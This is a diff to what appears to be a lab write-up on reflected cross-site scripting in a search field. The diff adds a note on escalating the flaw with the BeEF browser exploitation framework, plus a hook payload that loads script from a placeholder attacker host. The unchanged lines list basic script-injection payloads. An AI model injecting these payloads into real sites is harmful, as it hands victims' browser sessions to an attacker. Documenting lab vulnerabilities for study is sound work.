@@ -43,6 +43,11 @@ Search functionality reflects user input directly in the response.
 1. Submit crafted input in search field
 2. Payload is reflected in response
 3. JavaScript executed in browser context
+4. Post-Exploitation (BeEF Framework)
+ Although the lab focuses on basic JavaScript execution, the reflected XSS    vulnerability can be escalated to advanced browser exploitation using the
+  **BeEF (Browser Exploitation Framework)**.
+
+
 
 ---
 
@@ -50,4 +55,6 @@ Search functionality reflects user input directly in the response.
 - YOUWE<'
 - `<img src=s >`
 - `<script>alert(1)</script>`
+- ### BeEF Hook Payload Example
+- `<script src="http://ATTACKER_IP:3000/hook.js"></script>`
 
